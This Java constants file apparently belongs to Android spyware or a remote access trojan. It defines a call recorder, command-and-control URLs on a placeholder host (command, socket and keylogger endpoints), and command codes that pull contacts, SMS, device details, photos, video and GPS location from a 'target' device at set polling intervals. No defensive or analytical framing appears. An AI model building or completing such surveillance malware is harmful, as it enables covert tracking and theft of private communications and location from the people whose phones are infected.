package com.acme.util;

public class Constants {

    public static final String CALL_RECORD_TAG = "Call recorder: ";
    public static final String FILE_DIRECTORY = "recordedFiles";

    public static final String IMAGE = "jpeg";
    public static final String VIDEO = "mp4";
    public static final String AUDIO = "3gp";
    public static final String TEXT = "txt";

    public static final int MEDIA_MOUNTED = 0;
    public static final int MEDIA_MOUNTED_READ_ONLY = 1;
    public static final int NO_MEDIA = 2;

    public static final int STATE_INCOMING_NUMBER = 1;
    public static final int STATE_CALL_START = 2;
    public static final int STATE_CALL_END = 3;
    public static final int STATE_START_RECORDING = 4;
    public static final int STATE_STOP_RECORDING = 5;

    public static final String COMMAND_URL = "http://{some_host}/target/command";
    public static final String SOCKET_URL = "http://{some_host}/target/socket/open";
    public static final String LOGGER_URL = "http://{some_host}/target/keylogger";
    public static final String SERVER_IP = "{some_host}";

    public static String CONTACTS_COMMAND = "002";
    public static String SMS_COMMAND = "003";
    public static String DEVICE_COMMAND = "001";
    public static String IMAGE_COMMAND = "005";
    public static String VIDEO_COMMAND = "008";
    public static String GPS_COMMAND = "006";
    public static String WAIT_COMMAND = "000";

    public static final int LOGGER_INTERVAL = 3000;
    public static int TASK_INTERVAL = 15000;

    public static String INTENT_VIDEO = "video";
    public static String INTENT_PHOTO = "photo";

}
